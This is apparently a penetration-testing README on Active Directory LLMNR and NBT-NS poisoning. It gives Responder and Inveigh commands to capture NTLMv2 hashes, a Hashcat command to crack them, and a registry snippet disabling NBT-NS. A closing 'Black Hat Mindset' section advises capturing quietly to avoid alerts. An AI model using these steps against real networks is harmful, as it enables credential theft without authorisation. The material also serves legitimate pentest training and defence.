# Active Directory LLMNR and NBT-NS Poisoning

This README explores techniques to exploit Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) weaknesses, capturing credentials via poisoning attacks.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Poisoning Attacks](#poisoning-attacks)
- [Hash Cracking](#hash-cracking)
- [Disabling NBT-NS](#disabling-nbt-ns)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

LLMNR and NBT-NS are protocols used to resolve hostnames when DNS fails. Misconfigured or unpatched systems can be tricked into sending credentials to a malicious server via poisoning. This guide covers Responder (Linux) and Inveigh (Windows) to perform these attacks, followed by hash cracking with Hashcat, and disabling NBT-NS for defense or evasion.

## Setup and Prerequisites

- **Environment**: Linux host for Responder, Windows host for Inveigh.
- **Responder**: Install on Linux (e.g., `apt install responder` on Kali).
- **Inveigh**: Download the PowerShell script (`Inveigh.ps1`) or C# executable from its GitHub repo and place it in your working directory (e.g., `C:\Tools\`).
- **Hashcat**: Install on Linux (e.g., `apt install hashcat`) and prepare a wordlist (e.g., `/usr/share/wordlists/rockyou.txt`).
- **PowerShell**: Run with administrative privileges on Windows (right-click > "Run as Administrator").
- **Network Access**: Ensure the host is on the target network to intercept traffic.

## Poisoning Attacks

Use these tools to poison LLMNR and NBT-NS requests and capture credentials.

```bash
responder -h  # Displays usage instructions and options for Responder on a Linux host (e.g., -I for interface, -r for SMB relay)
```

```powershell
Import-Module .\Inveigh.ps1  # Imports the Inveigh PowerShell script on a Windows host

(Get-Command Invoke-Inveigh).Parameters  # Outputs available options and functionality for Invoke-Inveigh (e.g., -LLMNR, -NBNS)

Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y  # Starts Inveigh with LLMNR and NBT-NS spoofing enabled

.\Inveigh.exe  # Runs the C# implementation of Inveigh to perform poisoning
```

## Hash Cracking

Crack captured NTLMv2 hashes using Hashcat.

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt  # Uses Hashcat with mode 5600 (NetNTLMv2)
```

## Disabling NBT-NS

Disable NBT-NS to prevent poisoning or evade detection.

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { 
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose
}
```

## Black Hat Mindset

- **Exploit Weaknesses**: Target systems with disabled DNS or misconfigured name resolution for easy poisoning.
- **Capture Quietly**: Use Responder or Inveigh on a low-profile host to avoid triggering alerts.
- **Crack Efficiently**: Prioritize common passwords with a strong wordlist to quickly obtain credentials.
- **Control the Environment**: Disable NBT-NS on compromised hosts to prevent rival attackers from poisoning your foothold.

## Resources

- [Responder GitHub](https://github.com/lgandx/Responder)
- [Inveigh GitHub](https://github.com/Kevin-Robertson/Inveigh)
- [Hashcat Documentation](https://hashcat.net/wiki/)
- [LLMNR/NBT-NS Poisoning](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)

